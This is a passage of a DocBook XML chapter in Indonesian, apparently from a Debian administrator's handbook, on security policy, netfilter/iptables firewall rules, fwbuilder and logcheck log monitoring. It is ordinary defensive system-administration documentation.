<?xml version='1.0' encoding='utf-8' ?>
<!DOCTYPE chapter PUBLIC "-//OASIS//DTD DocBook XML V4.5//EN" "http://www.oasis-open.org/docbook/xml/4.5/docbookx.dtd" [
]>
<chapter id="security">
  <chapterinfo>
    <mediaobject condition="pdf">
      <imageobject>
        <imagedata fileref="images/chap-security.png" scalefit="1" />
      </imageobject>
    </mediaobject>
    <keywordset>
      <keyword>Firewall</keyword>
      <keyword>Netfilter</keyword>
      <keyword>IDS/NIDS</keyword>
    </keywordset>
  </chapterinfo>
  <title>Keamanan</title>
  <highlights>
    <para>Suatu sistem informasi bisa memiliki tingkat kepentingan yang bervariasi bergantung pada lingkungan. Dalam beberapa kasus, itu sangat penting untuk kelangsungan hidup perusahaan. Oleh karena itu harus dilindungi dari berbagai jenis risiko. Proses mengevaluasi risiko, menetapkan, dan melaksanakan perlindungan secara kolektif dikenal sebagai "proses keamanan".</para>
  </highlights>
  <section id="sect.defining-security-policy">
    <title>Menentukan suatu Kebijakan Keamanan</title>

    <sidebar>
      <title><emphasis>PERINGATAN</emphasis> Cakupan bab ini</title>

      <para>Keamanan adalah suatu subjek yang amat luas dan sangat sensitif, sehingga kami tidak bisa menyatakan menjelaskannya dengan cara yang komprehensif hanya dalam satu bab. Kami hanya akan menggambarkan beberapa hal yang penting dan menguraikan beberapa peralatan dan metode yang dapat dipergunakan dalam ranah keamanan. Untuk bacaan lebih lanjut, banyak literatur, dan buku-buku sepenuhnya dicurahkan ke masalah tersebut. Suatu titik awal yang sangat baik adalah <citetitle>Linux Server Security</citetitle> oleh Michael D. Bauer (diterbitkan oleh O'Reilly).</para>
    </sidebar>

    <para>Kata "keamanan" itu sendiri mencakup rentang yang sangat luas dari konsep, peralatan dan prosedur, yang tidak satupun berlaku secara universal. Memilih di antara mereka memerlukan ide yang presisi tentang apa tujuan Anda. Mengamankan suatu sistem dimulai dengan menjawab beberapa pertanyaan. Terburu-buru mengimplementasi sebarang set peralatan akan berrisiko memfokuskan ke aspek keamanan yang salah.</para>

    <para>Maka hal pertama yang perlu ditentukan adalah sasaran. Sebuah pendekatan yang baik untuk membantu penentuan itu dimulai dengan pertanyaan-pertanyaan berikut:</para>
    <itemizedlist>
      <listitem>
	<para><emphasis>Apa</emphasis> yang kita coba lindungi? Kebijakan keamanan akan berbeda bergantung kepada apakah kita ingin melindungi komputer atau data. Dalam kasus terakhir, kita juga perlu tahu data yang mana.</para>
      </listitem>
      <listitem>
	<para>Kita mencoba melindungi <emphasis>terhadap</emphasis> apa? Apakah kebocoran data konfidensial? Kehilangan data tanpa sengaja? Kehilangan pendapatan karena terputusnya layanan?</para>
      </listitem>
      <listitem>
	<para>Juga, kita mencoba melindungi terhadap <emphasis>siapa</emphasis>? Langkah-langkah keamanan akan sangat berbeda untuk melindungi terhadap salah ketik oleh pengguna biasa sistem dengan ketika melindungi dari kelompok penyerang yang bertekad kuat.</para>
      </listitem>
    </itemizedlist>

    <para>Istilah "risiko" lazim digunakan untuk merujuk secara kolektif kepada tiga faktor ini: apa yang harus dilindungi, apa yang perlu dicegah terjadi, dan siapa yang akan mencoba untuk membuat hal itu terjadi. Pemodelan risiko membutuhkan jawaban atas tiga pertanyaan ini. Dari model risiko ini, kebijakan keamanan dapat dibangun, dan kebijakan dapat diimplementasikan dengan tindakan-tindakan nyata.</para>

    <sidebar>
      <title><emphasis>CATATAN</emphasis> Mempertanyakan secara permanen</title>

      <para>Bruce Schneier, pakar dunia dalam masalah keamanan (bukan hanya keamanan komputer) mencoba untuk melawan salah satu mitos keamanan paling penting dengan motto: "Keamanan adalah sebuah proses, bukan produk". Aset yang harus dilindungi berubah dengan berjalannya waktu, dan begitu juga ancaman dan cara yang tersedia bagi para penyerang. Meskipun kebijakan keamanan awalnya telah dirancang dan dilaksanakan dengan sempurna, kita tidak boleh pernah berhenti di satu pencapaian. Komponen risiko terus berkembang dan respon terhadap risiko juga harus berkembang menyesuaikan.</para>
    </sidebar>

    <para>Tambahan kendala juga patut dipertimbangkan, karena mereka dapat membatasi rentang kebijakan yang tersedia. Sejauh apakah kita bersedia melangkah untuk mengamankan sistem? Pertanyaan ini memiliki dampak yang besar pada kebijakan yang diterapkan. Jawabannya terlalu sering hanya didefinisikan dalam hal biaya moneter, tapi elemen lain juga harus dipertimbangkan, seperti seberapa jauh ketidaknyamanan yang ditimbulkan pada pengguna sistem atau penurunan kinerja.</para>

    <para>Setelah risiko dimodelkan, kita dapat mulai berpikir tentang merancang kebijakan keamanan yang sebenarnya.</para>

    <sidebar>
      <title><emphasis>CATATAN</emphasis> Kebijakan ekstrim</title>

      <para>Ada kasus-kasus dimana pilihan tindakan yang diperlukan untuk mengamankan sistem ini sangat sederhana.</para>

      <para>Misalnya, jika sistem yang akan dilindungi hanya terdiri dari komputer bekas, yang satu-satunya penggunaan adalah untuk menambahkan beberapa angka pada akhir hari, memutuskan untuk tidak melakukan sesuatu yang khusus untuk melindunginya akan cukup masuk akal. Nilai intrinsik sistem rendah. Nilai data adalah nol karena mereka tidak disimpan di komputer. Penyerang potensial yang menginfiltrasi "sistem" ini hanya akan mendapatkan kalkulator berat. Biaya untuk mengamankan sistem seperti itu mungkin akan lebih besar daripada biaya pelanggaran.</para>

      <para>Di ujung lain spektrum, kita mungkin ingin untuk melindungi kerahasiaan data rahasia dengan cara yang sekomprehensif mungkin, mengalahkan pertimbangan lainnya. Dalam hal ini, respon yang tepat adalah penghancuran total data (secara aman menghapus berkas, memotong-motong hard disk menjadi butiran, lalu melarutkan butir-butir ini dalam asam, dan seterusnya). Jika ada persyaratan tambahan bahwa data harus disimpan untuk digunakan di masa depan (meskipun tidak selalu tersedia), dan jika biaya masih bukan merupakan faktor, maka titik awal adalah menyimpan data di piring alloy iridium-platinum yang disimpan dalam bunker tahan bom di bawah berbagai pegunungan di dunia, masing-masing (tentu saja) sepenuhnya rahasia dan dijaga oleh seluruh pasukan…</para>

      <para>Meskipun contoh-contoh ini mungkin tampak ekstrim, mereka tetap merupakan respon yang memadai terhadap risiko yang didefinisikan, sejauh mereka adalah hasil dari suatu proses pemikiran yang memperhitungkan tujuan yang akan dicapai dan kendala-kendala yang perlu memenuhi. Ketika datang dari keputusan yang beralasan, tidak ada kebijakan keamanan yang kurang terhormat daripada yang lain.</para>
    </sidebar>

    <para>Dalam kebanyakan kasus, sistem informasi dapat disegmentasi dalam subset-subset yang konsisten dan sebagian besar independen. Masing-masing subsistem akan memiliki persyaratan dan batasan sendiri, sehingga penilaian risiko dan desain kebijakan keamanan harus dilakukan secara terpisah untuk masing-masing. Prinsip yang baik untuk diingat adalah bahwa perimeter yang pendek dan didefinisikan dengan baik lebih mudah untuk dipertahankan daripada sebuah perbatasan yang panjang dan berliku. Jaringan organisasi harus juga dirancang secara sesuai: layanan-layanan sensitif harus dikonsentrasikan pada sejumlah kecil mesin, dan mesin ini hanya boleh diakses melalui sejumlah minimal titik pemeriksaan; mengamankan titik-titik pemeriksaan ini akan lebih mudah daripada mengamankan semua mesin sensitif terhadap seluruh dunia luar. Pada titik ini tampak kegunaan  penyaringan jaringan (termasuk oleh firewall) menjadi jelas. Penyaringan ini dapat dilaksanakan dengan perangkat keras khusus, tetapi solusi yang mungkin lebih sederhana dan lebih fleksibel adalah dengan menggunakan perangkat lunak firewall seperti yang terintegrasi dalam kernel Linux.</para>
  </section>
  <section id="sect.firewall-packet-filtering">
    <title>Firewall atau Penyaringan Paket</title>
    <indexterm><primary>firewall</primary></indexterm>
    <indexterm><primary>penyaring paket</primary></indexterm>

    <sidebar>
      <title><emphasis>KEMBALI KE DASAR</emphasis> Firewall</title>
      <indexterm><primary>paket</primary><secondary>IP</secondary></indexterm>

      <para><emphasis>Firewall</emphasis> adalah peralatan komputer dengan perangkat keras dan/atau perangkat lunak yang menyortir paket jaringan masuk atau keluar (datang ke atau dari jaringan lokal) dan hanya mengizinkan lewat paket-paket yang cocok dengan kondisi standar tertentu.</para>
    </sidebar>

    <para>Firewall adalah gateway jaringan penyaring dan hanya efektif pada paket yang harus pergi melawatinya. Oleh karena itu, itu hanya dapat efektif ketika melalui firewall adalah satu-satunya rute untuk paket-paket ini.</para>

    <para>Kurangnya konfigurasi standar (dan motto "proses, bukan produk") menjelaskan kurangnya solusi turn-key. Namun, ada alat yang membuatnya mudah untuk mengkonfigurasi firewall <emphasis>netfilter</emphasis>, dengan representasi grafis dari aturan penyaringan. <command>fwbuilder</command> tidak diragukan adalah lagi salah satu yang terbaik.</para>
    <indexterm><primary><emphasis>netfilter</emphasis></primary></indexterm>

    <sidebar>
      <title><emphasis>KASUS SPESIFIK</emphasis> Firewall Lokal</title>

      <para>Firewall dapat dibatasi ke salah satu mesin tertentu (sebagai lawan dari jaringan yang lengkap), dalam hal ini perannya adalah untuk menyaring atau membatasi akses ke beberapa layanan, atau mungkin untuk mencegah hubungan keluar dari perangkat lunak nakal yang oleh pengguna, sengaja atau tidak, memasangnya.</para>
    </sidebar>

    <para>Linux kernel menyertakan firewall <emphasis>netfilter</emphasis>. Ini dapat dikontrol dari ruang pengguna dengan perintah <command>iptables</command> dan <command>ip6tables</command>. Perbedaan antara kedua perintah adalah bahwa yang pertama bertindak pada jaringan IPv4, sedangkan yang kedua bertindak pada IPv6. Karena kedua tumpukan protokol jaringan mungkin akan tetap ada selama bertahun-tahun, kedua alat akan perlu digunakan secara paralel.</para>
    <indexterm><primary><command>iptables</command></primary></indexterm>
    <indexterm><primary><command>ip6tables</command></primary></indexterm>
    <section id="sect.netfilter">
      <title>Perilaku Netfilter</title>

      <para><emphasis>netfilter</emphasis> memakai empat tabel berbeda yang menyimpan aturan-aturan yang mengatur tiga jenis operasi pada paket:</para>
      <itemizedlist>
        <listitem>
	  <para><literal>filter</literal> menyangkut aturan penyaringan (menerima, menolak, atau mengabaikan suatu paket);</para>
        </listitem>
        <listitem>
	  <para><literal>nat</literal> menyangkut penerjemahan alamat dan port sumber atau tujuan dari paket-paket;</para>
        </listitem>
        <listitem>
	  <para><literal>mangle</literal> menyangkut perubahan-perubahan lain ke paket-paket IP (termasuk ToS — <emphasis>Type of Service</emphasis> — ruas dan opsi);</para>
        </listitem>
        <listitem>
	  <para><literal>raw</literal> mengizinkan modifikasi manual lain pada paket-paket sebelum mereka mencapai sistem pelacakan koneksi.</para>
        </listitem>
      </itemizedlist>

      <para>Setiap tabel berisi daftar aturan yang disebut <emphasis>rantai</emphasis>. Firewall menggunakan rantai standar untuk menangani paket berdasarkan keadaan terpradefinisi. Administrator dapat membuat rantai lainnya, yang hanya akan digunakan ketika dirujuk oleh salah satu rantai standar (baik secara langsung maupun tidak langsung).</para>
      <indexterm><primary>chain</primary></indexterm>
      <indexterm><primary>aturan penyaringan</primary></indexterm>

      <para>Tabel <literal>filter</literal> memiliki tiga rantai standar:</para>
      <itemizedlist>
        <listitem>
	  <para><literal>INPUT</literal>: menyangkut paket-paket yang tujuannya adalah firewall itu sendiri;</para>
        </listitem>
        <listitem>
	  <para><literal>OUTPUT</literal>: menyangkut paket-paket yang dipancarkan oleh firewall;</para>
        </listitem>
        <listitem>
	  <para><literal>FORWARD</literal>: menyangkut paket-paket yang transit melalui firewall (yang bukan sumber atau tujuan mereka).</para>
        </listitem>
      </itemizedlist>

      <para>Tabel <literal>nat</literal> juga memiliki tiga rantai standar:</para>
      <itemizedlist>
        <listitem>
	  <para><literal>PREROUTING</literal>: untuk mengubah paket segera setelah mereka tiba;</para>
        </listitem>
        <listitem>
	  <para><literal>POSTROUTING</literal>: untuk mengubah paket-paket ketika mereka siap melanjutkan perjalanan;</para>
        </listitem>
        <listitem>
	  <para><literal>OUTPUT</literal>: untuk mengubah paket-paket yang dibuat oleh firewall itu sendiri.</para>
        </listitem>
      </itemizedlist>

      <figure id="figure.chaines-netfilter">
        <title>Bagaimana rantai <emphasis>netfilter</emphasis> dipanggil</title>
        <mediaobject>
          <imageobject>
            <imagedata fileref="images/netfilter.png" scalefit="1" width="65%" />
          </imageobject>
        </mediaobject>
      </figure>

      <para>Masing-masing rantai adalah daftar aturan; setiap aturan adalah satu set kondisi dan tindakan yang akan dieksekusi ketika kondisi terpenuhi. Ketika mengolah suatu paket, firewall memindai rantai yang cocok, satu demi satu aturan; ketika kondisi untuk aturan terpenuhi, itu "melompat" (maka opsi <literal>-j</literal> di perintah) ke tindakan yang ditetapkan untuk melanjutkan pemrosesan. Perilaku yang paling umum distandarkan, dan tindakan khusus ada untuk mereka. Mengambil salah satu tindakan standar ini menginterupsi pemrosesan rantai, karena nasib paket yang sudah disegel (asal tidak terkena pengecualian yang disebutkan di bawah):</para>

      <sidebar>
        <title><emphasis>KEMBALI KE DASAR</emphasis> ICMP</title>

	<para>ICMP (<emphasis>Internet Control Message</emphasis> Protocol) merupakan protokol yang digunakan untuk mengirimkan informasi pelengkap pada komunikasi. Hal ini memungkinkan pengujian konektivitas jaringan dengan perintah <command>ping</command> (yang mengirim pesan <emphasis>permintaan echo</emphasis> ICMP, yang oleh penerima dimaksudkan untuk dijawab dengan pesan <emphasis>balasan echo</emphasis> ICMP). Itu menandakan bahwa firewall menolak paket, menunjukkan meluapnya penyangga penerima, mengusulkan rute yang lebih baik untuk paket-paket berikutnya dalam hubungan, dan seterusnya. Protokol ini didefinisikan oleh beberapa dokumen RFC; RFC777 awal dan RFC792 segera selesai dan diperpanjang. <ulink type="block" url="http://www.faqs.org/rfcs/rfc777.html" /> <ulink type="block" url="http://www.faqs.org/rfcs/rfc792.html" /></para>

	<para>Untuk referensi, suatu penyangga penerima adalah sebuah zona memori kecil yang menyimpan data antara saat itu datang dari jaringan dan saat kernel menanganinya. Jika zona ini penuh, data baru tidak dapat diterima, dan ICMP mengirim sinyal adanya masalah, sehingga pengirim dapat memperlambat laju transfer (yang idealnya harus mencapai suatu keseimbangan setelah beberapa waktu).</para>
        <indexterm><primary>ICMP</primary></indexterm>
        <indexterm><primary>Internet Control Message Protocol</primary></indexterm>
        <indexterm><primary>penyangga penerimaan</primary></indexterm>
        <indexterm><primary>penyangga</primary><secondary>penyangga penerimaan</secondary></indexterm>
        <indexterm><primary><command>ping</command></primary></indexterm>

	<para>Perhatikan bahwa meskipun jaringan IPv4 dapat bekerja tanpa ICMP, ICMPv6 secara ketat diperlukan untuk jaringan IPv6, karena itu memadukan beberapa fungsi yang, di dunia IPv4, tersebar di ICMPv4, IGMP (<emphasis>Internet Group Membership Protocol</emphasis>), dan ARP (<emphasis>Address Resolution Protocol</emphasis>). ICMPv6 didefinisikan dalam RFC4443. <ulink type="block" url="http://www.faqs.org/rfcs/rfc4443.html" /></para>
      </sidebar>

      <para></para>
      <itemizedlist>
        <listitem>
	  <para><literal>ACCEPT</literal>: mengizinkan paket melanjutkan perjalanannya;</para>
        </listitem>
        <listitem>
	  <para><literal>REJECT</literal>: menolak paket dengan paket galat ICMP (opsi <literal>--reject-with <replaceable>tipe</replaceable></literal> ke <command>iptables</command> mengizinkan memilih tipe galat);</para>
        </listitem>
        <listitem>
	  <para><literal>DROP</literal>: hapus (abaikan) paket;</para>
        </listitem>
        <listitem>
	  <para><literal>LOG</literal>: mencatat log (melalui <command>syslog</command>) suatu pesa dengan keterangan atas paket; perhatikan bahwa aksi ini tidak mengiterupsi pemrosesan, dan eksekusi dari rantai berlanjut pada aturan berikutnya, sehingga untuk mencatat log paket yang ditolak memerlukan aturan LOG dan REJECT/DROP;</para>
        </listitem>
        <listitem>
	  <para><literal>ULOG</literal>: mencatat log pesan melalui <command>ulogd</command>, yang bisa diadaptasi lebih baik dan lebih efisien daripada <command>syslogd</command> untuk menangani banyak pesan; perhatikan bahwa aksi ini, seperti LOG, juga kembali memroses ke aturan selanjutnya dalan rantai pemanggil;</para>
        </listitem>
        <listitem>
	  <para><replaceable>nama_rantai</replaceable>: melompat ke rantai yang diberikan dan mengevaluasi aturan-aturannya;</para>
        </listitem>
        <listitem>
	  <para><literal>RETURN</literal>: menginterupsi pemrosesan dari rantai saat ini, dan kembali ke rantai pemanggil; dalam hal rantai saat ini adalah suatu rantai standar, tidak ada rantai pemanggil, sehingga aksi baku (didefinisikan dengan opsi <literal>-P</literal> ke <command>iptables</command>) dieksekusi sebagai pengganti;</para>
        </listitem>
        <listitem>
	  <para><literal>SNAT</literal> (hanya dalam tabel <literal>nat</literal>): menerapkan <emphasis>NAT Sumber</emphasis> (opsi tambahan menjelaskan perubahan eksak yang akan diterapkan);</para>
        </listitem>
        <listitem>
	  <para><literal>DNAT</literal> (hanya dalam tabel <literal>nat</literal>): menerapkan <emphasis>NAT Tujuan</emphasis> (opsi tambahan menjelaskan perubahan eksak apa yang akan diterapkan);</para>
        </listitem>
        <listitem>
	  <para><literal>MASQUERADE</literal> (hanya dalam tabel <literal>nat</literal>): menerapkan <emphasis>masquerading</emphasis> (suatu kasus khusus dari <emphasis>NAT Sumber</emphasis>);</para>
        </listitem>
        <listitem>
	  <para><literal>REDIRECT</literal> (hanya dalam tabel <literal>nat</literal>): mengalihkan suatu paket ke port lain firewall itu sendiri; ini dapat dipakai untuk menyiapkan satu proksi web transparan yang bekerja tanpa konfigurasi pada sisi klien, karena klien mengira dia menyambung ke penerima padahal komunikasi sebenarnya melalui proksi.</para>
        </listitem>
      </itemizedlist>

      <para>Aksi-aksi lain, terutama yang menyangkut tabel <literal>mangle</literal>, di luar cakupan dari teks ini. <citerefentry><refentrytitle>iptables</refentrytitle><manvolnum>8</manvolnum></citerefentry> dan <citerefentry><refentrytitle>ip6tables</refentrytitle><manvolnum>8</manvolnum></citerefentry> mempunyai daftar yang komprehensif.</para>
    </section>
    <section id="sect.iptables">
      <title>Sintaks dari <command>iptables</command> dan <command>ip6tables</command></title>

      <para>Perintah <command>iptables</command> dan <command>ip6tables</command> mengizinkan manipulasi tabel, rantai, dan aturan. Opsi <literal>-t <replaceable>tabel</replaceable></literal> mengindikasikan tabel mana tempat beroperasi (bakunya, <literal>filter</literal>).</para>
      <indexterm><primary><command>iptables</command></primary></indexterm>
      <indexterm><primary><command>ip6tables</command></primary></indexterm>
      <section id="sect.iptables-command">
        <title>Perintah</title>

	<para>Opsi <literal>-N <replaceable>chain</replaceable></literal> membuat sebuah rantai baru. <literal>-X <replaceable>rantai</replaceable></literal> menghapus suatu rantai yang kosong dan tidak dipakai. <literal>-A <replaceable>rantai</replaceable> <replaceable>aturan</replaceable></literal> menambahkan suatu aturan di ujung rantai yang diberikan. Opsi <literal>-I <replaceable>rantai</replaceable> <replaceable>no_aturan</replaceable> <replaceable>aturan</replaceable></literal> menyisipkan suatu aturan sebelum aturan nomor <replaceable>no_aturan</replaceable>. Opsi <literal>-D <replaceable>rantai</replaceable> <replaceable>no_aturan</replaceable></literal> (atau <literal>-D <replaceable>rantai</replaceable> <replaceable>aturan</replaceable></literal>) menghapus suatu aturan dalam sebuah ranti, sintaks pertama mengidentifikasi aturan yang akan dihapus berdasarkan nomornya, sedangkan yang belakangan mengidentifikasi menurut isinya. Opsi <literal>-F <replaceable>rantai</replaceable></literal> menggelontor suatu rantai (menghapus semua aturannya); bila tidak ada rantai yang disebutkan, semua rantai dalam tabel dihapus. Opsi <literal>-L <replaceable>rantai</replaceable></literal> menampilkan daftar aturan dalam suatu rantai. Akhirnya, opsi <literal>-P <replaceable>rantai</replaceable> <replaceable>aksi</replaceable></literal> menentukan aksi baku, atau "kebijakan", bagi suatu rantai yang diberikan; perhatikan bahwa hanya rantai standar yang bisa memiliki kebijakan seperti itu.</para>
      </section>
      <section id="sect.iptables-rules">
        <title>Aturan</title>
        <indexterm><primary>aturan penyaringan</primary></indexterm>

	<para>Setiap aturan dinyatakan sebagai <literal><replaceable>kondisi</replaceable> -j <replaceable>aksi</replaceable><replaceable>opsi_aksi</replaceable></literal>. Bila beberapa kondisi diuraikan dalam aturan yang sama, maka kriteria adana konjungsi (<emphasis>and</emphasis> lojik) dan kondisi-kondisi, yang paling kurang membatasi daripada setiap kondisi individual.</para>

	<para>Persyaratan <literal>-p <replaceable>protokol</replaceable></literal> dicocokkan dengan field protokol dari paket IP. Nilai-nilai paling umum adalah <literal>tcp</literal>, <literal>udp</literal>, <literal>icmp</literal>, dan <literal>icmpv6</literal>. Memberi awalan tanda seru ke syarat menegasi kondisi, yang kemudian menjadi kecocokan atas "sebarang paket dengan protokol yang berbeda dengan yang dinyatakan". Mekanisme negasi ini tidak spesifik ke opsi <literal>-p</literal> dan juga dapat diterapkan ke syarat-syarat lain.</para>

	<para>Syarat <literal>-s<replaceable>alamat</replaceable></literal> atau <literal>-s <replaceable>jaringan/mask</replaceable></literal> mencocokkan alamat sumber paket. Sedangkan <literal>-d <replaceable>alamat</replaceable></literal> atau <literal>-d <replaceable>jaringan/mask</replaceable></literal> mencocokkan alamat tujuan.</para>

	<para>Syarat <literal>-i <replaceable>antarmuka</replaceable></literal> memilih paket-paket yang datang dari antarmuka jaringan tertentu. <literal>-o <replaceable>antarmuka</replaceable></literal> memilih paket-paket yang akan keluar pada antarmuka tertentu.</para>

	<para>Ada kondisi-kondisi yang lebih spesifik, tergantung pada kondisi generik yang dijelaskan di atas. Sebagai contoh, kondis <literal>-p tcp</literal> dapat dilengkapi dengan kondisi pada port TCP, dengan persyaratan seperti <literal>--source-port <replaceable>port</replaceable></literal> dan <literal>--destination-port<replaceable>port </replaceable></literal>.</para>

	<para>Persyaratan <literal>--state <replaceable>keadaan</replaceable></literal> sesuai dengan keadaan paket dalam sebuah koneksi (ini memerlukan modul kernel <command>ipt_conntrack</command>, untuk pelacakan koneksi). Keadaan <literal>NEW</literal> menjelaskan suatu paket yang memulai sambungan baru; <literal>ESTABLISHED</literal> sesuai dengan paket-paket milik sambungan yang sudah ada, dan <literal>RELATED</literal> sesuai dengan paket-paket yang memulai sambungan baru yang berkaitan dengan yang sudah ada (yang berguna untuk sambungan <literal>ftp-data</literal> dalam modus "aktif" dari protokol FTP).</para>

	<para>Bagian sebelumnya mencantumkan daftar tindakan yang tersedia, tetapi tidak pilihan mereka masing-masing. Tindakan <literal>LOG</literal> misalnya, memiliki pilihan berikut:</para>
        <itemizedlist>
          <listitem>
	    <para><literal>--log-level</literal>, dengan nilai baku <literal>warning</literal>, menunjukkan tingkat severity <command>syslog</command>;</para>
          </listitem>
          <listitem>
	    <para><literal>--log-prefix</literal> memungkinkan menentukan teks awalan untuk membedakan antara pesan-pesan log;</para>
          </listitem>
          <listitem>
	    <para><literal>--log-tcp-sequence</literal>, <literal>-log-tcp-options</literal>, dan <literal>--log-ip-options</literal> menunjukkan data tambahan yang akan diintegrasikan ke dalam pesan: masing-masing, nomor urutan TCP, opsi TCP, dan opsi IP.</para>
          </listitem>
        </itemizedlist>

	<para>Tindakan <literal>DNAT</literal> menyediakan pilihan <literal>--to-destination <replaceable>alamat</replaceable>:<replaceable>port</replaceable></literal> untuk menunjukkan alamat IP tujuan dan/atau port baru. Demikian pula, <literal>SNAT</literal> menyediakan <literal>--to-source <replaceable>alamat</replaceable>:<replaceable>port</replaceable></literal> untuk menunjukkan alamat IP sumber dan/atau port baru.</para>

	<para>Aksi <literal>PENGALIHAN</literal> (hanya tersedia jika NAT tersedia ) menyajikan <literal>--to-ports <replaceable>port(s)</replaceable></literal> pilihn untuk mengindikasi port, atau jangkauan port, dimana paket harusnya dialihkan.</para>
      </section>
    </section>
    <section id="sect.creating-rules">
      <title>Membuat Aturan</title>

      <para>Setiap penciptaan aturan memerlukan satu pemanggilan <command>iptables</command>/<command>ip6tables</command>. Mengetik perintah ini secara manual dapat membosankan, sehingga panggilan biasanya disimpan dalam skrip sehingga konfigurasi yang sama diatur secara otomatis setiap kali mesin di-boot. Skrip ini dapat ditulis dengan tangan, tetapi menarik juga untuk mempersiapkan dengan alat tingkat tinggi seperti <command>fwbuilder</command>.</para>

      
      <screen>
<computeroutput># </computeroutput><userinput>apt install fwbuilder</userinput></screen>

      <para>Prinsipnya sederhana. Dalam langkah pertama, kita perlu menjelaskan semua elemen yang akan terlibat dalam aturan yang sebenarnya:</para>
      <itemizedlist>
        <listitem>
	  <para>firewall itu sendiri, dengan antarmuka jaringannya;</para>
        </listitem>
        <listitem>
	  <para>jaringan, dengan rentang IP mereka yang sesuai;</para>
        </listitem>
        <listitem>
	  <para>server;</para>
        </listitem>
        <listitem>
	  <para>port milik layanan yang diwadahi server.</para>
        </listitem>
      </itemizedlist>

      <para>Aturan kemudian dibuat dengan aksi drag-and-drop sederhana pada objek. Beberapa menu kontekstual dapat mengubah kondisi (meniadakannya, misalnya). Maka tindakan perlu dipilih dan dikonfigurasi.</para>

      <para>Sejauh menyangkut IPv6, seseorang dapat membuat dua aturan yang berbeda untuk IPv4 dan IPv6, atau hanya membuat satu dan membiarkan <command>fwbuilder</command> menerjemahkan aturan sesuai dengan alamat yang ditetapkan untuk objek.</para>

      <figure id="figure.fwbuilder">
        <title>Jendela utama Fwbuilder</title>
        <mediaobject>
          <imageobject>
            <imagedata fileref="images/fwbuilder.png" scalefit="1" />
          </imageobject>
        </mediaobject>
      </figure>
      <indexterm><primary><command>fwbuilder</command></primary></indexterm>

      <para><command>fwbuilder</command> kemudian dapat menghasilkan skrip konfigurasi firewall sesuai dengan aturan yang telah ditentukan. Arsitektur modular memberi kemampuan untuk menghasilkan skrip-skrip yang menarget sistem-sistem yang berbeda (<command>iptables</command> untuk Linux, <command>ipf</command> untuk FreeBSD, dan <command>pf</command> untuk OpenBSD).</para>

    </section>
    <section id="sect.install-rules-at-boot">
      <title>Menginstal Aturan Pada Setiap Boot</title>

      <para>Dalam kasus lain, cara yang disarankan adalah mendaftarkan skrip konfigurasi dalam direktif <literal>up</literal> dari berkas <filename>/etc/network/interfaces</filename>. Pada contoh berikut, skrip disimpan di bawah <filename>/usr/local/etc/arrakis.fw</filename>.</para>

      <example id="example.network-interfaces-firewall">
        <title>berkas <filename>interface</filename> yang memanggil skrip firewall</title>

        <programlisting>auto eth0
iface eth0 inet static
    address 192.168.0.1
    network 192.168.0.0
    netmask 255.255.255.0
    broadcast 192.168.0.255
    up /usr/local/etc/arrakis.fw</programlisting>
      </example>
      <para>Ini jelas mengasumsikan bahwa Anda menggunakan <emphasis role="pkg">ifupdown</emphasis> untuk mengkonfigurasi antarmuka jaringan. Jika Anda menggunakan sesuatu yang lain (seperti <emphasis>NetworkManager</emphasis> atau <emphasis>systemd-networkd</emphasis>), maka rujuklah ke dokumentasi mereka masing-masing untuk mengetahui cara menjalankan skrip setelah antarmuka telah dihidupkan.</para>

    </section>
  </section>
  <section id="sect.supervision">
    <title>Supervisi: Pencegahan, Deteksi, Deteren</title>
    <indexterm><primary>pemantauan</primary></indexterm>

    <para>Pemantauan adalah bagian integral dari kebijakan keamanan untuk beberapa alasan. Di antara mereka, bahwa tujuan keamanan adalah biasanya tidak terbatas pada menjamin kerahasiaan data, tetapi juga termasuk memastikan ketersediaan layanan. Oleh karena itu sangat penting untuk memeriksa bahwa semuanya bekerja seperti yang diharapkan, dan untuk mendeteksi tepat perilaku menyimpang atau mengubah kualitas layanan yang diberikan. Memantau aktivitas dapat membantu mendeteksi upaya intrusi dan memungkinkan reaksi cepat sebelum mereka menimbulkan konsekuensi serius. Bagian ini mengulas beberapa alat yang dapat digunakan untuk memonitor beberapa aspek dari sistem Debian. Dengan demikian, itu melengkapi <xref linkend="sect.monitoring" />.</para>
    <section id="sect.logcheck">
      <title>Memantau Log dengan <command>logcheck</command></title>
      <indexterm><primary><command>logcheck</command></primary></indexterm>
      <indexterm><primary>log</primary><secondary>pemantauan</secondary></indexterm>
      <indexterm><primary>pemantauan</primary><secondary>berkas log</secondary></indexterm>

      <para>Program <command>logcheck</command> memonitor berkas log setiap jam secara default. Ia akan mengirimkan pesan-pesan log yang tidak biasa melalui email ke administrator untuk analisa lebih lanjut.</para>

      <para>Daftar berkas yang dipantau disimpan dalam <filename>/etc/logcheck/logcheck.logfiles</filename>; nilai-nilai default bekerja dengan baik jika berkas <filename>/etc/rsyslog.conf</filename> belum dibongkar habis.</para>

      <para><command>logcheck</command> dapat bekerja di salah satu dari tiga mode yang lebih atau kurang rinci: <emphasis>paranoid</emphasis>, <emphasis>server</emphasis>, dan <emphasis>workstation</emphasis>. Yang pertama adalah <emphasis>sangat</emphasis> rinci, dan mungkin dapat dibatasi ke server tertentu seperti firewall. Modus kedua (dan default) dianjurkan bagi kebanyakan server. Terakhir dirancang untuk workstation, dan ini bahkan lebih ringkas (itu menyaring lebih banyak pesan).</para>

      <para>Dalam ketiga kasus, <command>logcheck</command> mungkin perlu disesuaikan untuk mengecualikan beberapa pesan tambahan (tergantung pada layanan yang terpasang), kecuali jika admin benar-benar ingin menerima batch per jam surel-surel panjang yang tidak menarik. Karena mekanisme pemilihan pesan agak rumit, perlu membaca <filename>/usr/share/doc/logcheck-database/README.logcheck-database.gz</filename> — walaupun menantang.</para>

      <para>Aturan yang diterapkan dapat dipecah menjadi beberapa jenis:</para>
      <itemizedlist>
        <listitem>
	  <para>yang memenuhi syarat sebuah pesan sebagai upaya memecah kata sandi (disimpan dalam berkas dalam direktori <filename>/etc/logcheck/cracking.d/</filename>);</para>
        </listitem>
        <listitem>
	  <para>yang membatalkan kualifikasi seperti itu (<filename>/etc/logcheck/cracking.ignore.d/</filename>);</para>
        </listitem>
        <listitem>
	  <para>yang mengklasifikasi pesan sebagai sebuah peringatan keamanan (<filename>/etc/logcheck/violations.d/</filename>);</para>
        </listitem>
        <listitem>
	  <para>yang membatalkan klasifikasi ini (<filename>/etc/logcheck/violations.ignore.d/</filename>);</para>
        </listitem>
        <listitem>
	  <para>akhirnya, yang diterapkan ke pesan yang tersisa (dianggap sebagai <emphasis>kejadian-kejadian sistem</emphasis>).</para>
        </listitem>
      </itemizedlist>

      <sidebar>
        <title><emphasis>HATI-HATI</emphasis> Mengabaikan suatu pesan</title>

